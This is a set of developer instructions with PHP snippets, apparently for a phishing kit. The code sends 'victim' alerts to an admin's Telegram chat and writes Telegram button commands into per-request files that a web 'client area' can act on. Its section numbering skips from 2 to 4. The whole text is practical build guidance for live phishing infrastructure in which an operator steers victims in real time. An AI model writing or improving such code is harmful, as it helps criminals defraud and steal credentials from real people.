1. Store message_id and chat_id after sending the initial victim message
This is usually done in includes/php/bot_api.php when sending the initial message. Locate the function that sends the first victim alert (e.g., bot_api('sendMessage', ...)). After calling it, store the returned IDs in $_SESSION.

Example in texts.php or wherever the first message is sent:

$result = bot_api('sendMessage', $fields);
if ($result && $result['ok']) {
    $_SESSION['chat_id'] = $result['result']['chat']['id'];
    $_SESSION['msg_id'] = $result['result']['message_id'];
} else {
    // handle error

Make sure $fields contains 'chat_id' => $config['admin_chat_id'] (the admin's chat ID). The chat_id stored is the admin's chat, not the victim's. That's fine – we'll use it for all subsequent edits.

2. Callback data truncation (telegram_sanitize_reply_markup)
Add this function to includes/php/bot_api.php (if not already present):

php
function telegram_sanitize_reply_markup($reply_markup) {
    if (!isset($reply_markup['inline_keyboard'])) return $reply_markup;
    foreach ($reply_markup['inline_keyboard'] as &$row) {
        foreach ($row as &$button) {
            if (isset($button['callback_data']) && strlen($button['callback_data']) > 64) {
                // truncate to 64 bytes, preserving the space between ID and command
                $parts = explode(' ', $button['callback_data'], 2);
                $id = substr($parts[0], 0, 64 - (strlen($parts[1]) + 1));
                $button['callback_data'] = $id . ' ' . $parts[1];
            }
        }
    }
    return $reply_markup;
}
Call this function before sending any message or edit that includes a keyboard.

4. Webhook callback handling with logging and answerCallbackQuery
In client-area/webhook.php, within the callback_query block:

php
if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $data = $callback['data'];

    // Log raw data
    $debug_log = __DIR__ . '/commands/debug.log';
    file_put_contents($debug_log, date('Y-m-d H:i:s') . " - Raw callback: $data\n", FILE_APPEND);

    // Parse using explode with limit 2
    $parts = explode(' ', $data, 2);
    if (count($parts) === 2) {
        $request_id = $parts[0];
        $bot_command = $parts[1];

        // Answer callback immediately
        bot_api('answerCallbackQuery', ['callback_query_id' => $callback['id']]);

        // Write command file
        $commands_dir = __DIR__ . '/commands/';
        if (!is_dir($commands_dir)) mkdir($commands_dir, 0777, true);
        $file = $commands_dir . $request_id . '.txt';
        if (file_put_contents($file, $bot_command) !== false) {
            file_put_contents($debug_log, date('Y-m-d H:i:s') . " - Written: $request_id -> $bot_command\n", FILE_APPEND);
        } else {
            file_put_contents($debug_log, date('Y-m-d H:i:s') . " - ERROR writing: $request_id\n", FILE_APPEND);
        }
    } else {
        file_put_contents($debug_log, date('Y-m-d H:i:s') . " - Failed to parse: $data\n", FILE_APPEND);
    }
}
Make sure bot_api is available (you can reuse the existing bot_reply function or define a simple one for answering callbacks).
